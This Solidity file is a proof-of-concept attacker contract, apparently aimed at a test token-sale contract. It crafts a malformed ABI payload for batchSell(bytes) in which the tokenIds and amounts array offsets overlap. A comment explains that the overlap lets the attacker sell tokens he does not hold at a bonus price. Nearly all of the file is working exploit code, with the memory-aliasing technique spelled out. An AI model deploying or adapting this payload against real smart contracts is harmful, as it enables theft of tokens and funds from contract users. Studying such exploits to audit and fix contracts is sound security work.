pragma solidity 0.5.10;

contract Attacker {
    uint256[] tokenIds;
    uint256[] amounts;
    address tsAddr;

    constructor(address _addr) public {
        tsAddr = _addr;
        tokenIds.push(1);
        amounts.push(1);
    }
    
    function setTestData() public {
        bytes4 sig = bytes4(keccak256("setTestData()"));
        tsAddr.call(abi.encodePacked(sig));
    }

    /**
     * The pointer for tokenIds and amounts array is the same when passed to batchSell()
     * Since the bytes array is decoded in batchSell(), modifying one of these arrays will also modify the other
     * So when amount to sell is updated due to bonus, tokenId will also get updated
     * This enables an attacker to sell tokens he does not have and get a better price
     */
    function attack() public {
        bytes4 sig = bytes4(keccak256("batchSell(bytes)"));
        uint256 bytesPointer = uint256(32);
        uint256 bytesLen = uint256(192);
        uint256 arrayPointer = uint256(64);
        uint256 arrayPointer2 = uint256(64); //128 for correct behaviour
        tsAddr.call(abi.encodePacked(sig, bytesPointer, bytesLen, arrayPointer, arrayPointer2, tokenIds.length, tokenIds, amounts.length, amounts));
    }
}